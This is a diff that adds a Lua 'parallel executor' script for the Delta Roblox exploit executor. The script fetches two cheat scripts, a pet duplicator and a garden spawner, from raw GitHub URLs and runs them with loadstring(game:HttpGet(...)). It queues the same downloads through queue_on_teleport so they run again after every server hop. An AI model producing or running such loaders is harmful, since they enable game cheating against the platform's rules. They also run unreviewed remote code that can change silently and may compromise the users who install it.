@@ -1,0 +1,72 @@
+-- Parallel Script Executor for Delta Roblox Executor
+-- This script will load and execute two scripts in parallel:
+-- 1. DupePet1 script (auto-updated from your GitHub)
+-- 2. GardenSpawner's Spawner.lua (auto-updated from GitHub)
+-- It also supports auto-execution after server hop or rejoin.
+
+-- You can place this script in your Delta auto-execute folder for persistent execution.
+
+-- AUTORUN HANDLER (for Delta, most executors support autoexec via folder, but we add redundancy)
+if not _G.__parallel_executor_initialized then
+    _G.__parallel_executor_initialized = true
+
+    -- Function to execute both scripts in parallel
+    local function runScripts()
+        -- First Script: DupePet1
+        local success1, err1 = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/vntai135/dupepet1/refs/heads/main/script"))()
+        end)
+
+        -- Second Script: GardenSpawner
+        local success2, err2 = pcall(function()
+            local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/ataturk123/GardenSpawner/refs/heads/main/Spawner.lua"))()
+            if Spawner and type(Spawner.Load) == "function" then
+                Spawner.Load()
+            end
+        end)
+
+        if not success1 then
+            warn("[Parallel Executor] Failed to execute DupePet1 script:", err1)
+        end
+        if not success2 then
+            warn("[Parallel Executor] Failed to execute Spawner script:", err2)
+        end
+    end
+
+    -- Execute scripts on load
+    runScripts()
+
+    -- Listen for Teleport (server hop/rejoin) and auto-execute after teleport
+    local function setupTeleportAutoExec()
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+        local TeleportService = game:GetService("TeleportService")
+
+        local queueScript = [[
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/vntai135/dupepet1/refs/heads/main/script"))()
+            local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/ataturk123/GardenSpawner/refs/heads/main/Spawner.lua"))()
+            if Spawner and type(Spawner.Load) == "function" then
+                Spawner.Load()
+            end
+        ]]
+
+        TeleportService.TeleportInitFailed:Connect(function()
+            -- In case teleport fails, run scripts again
+            runScripts()
+        end)
+
+        -- Queue scripts after teleport
+        if queue_on_teleport then
+            queue_on_teleport(queueScript)
+        elseif syn and syn.queue_on_teleport then
+            syn.queue_on_teleport(queueScript)
+        elseif KRNL_LOADED and queue_on_teleport then
+            queue_on_teleport(queueScript)
+        end
+    end
+
+    -- Setup teleport auto-execute
+    pcall(setupTeleportAutoExec)
+
+    print("[Parallel Executor] Scripts loaded and auto-exec enabled.")
+end
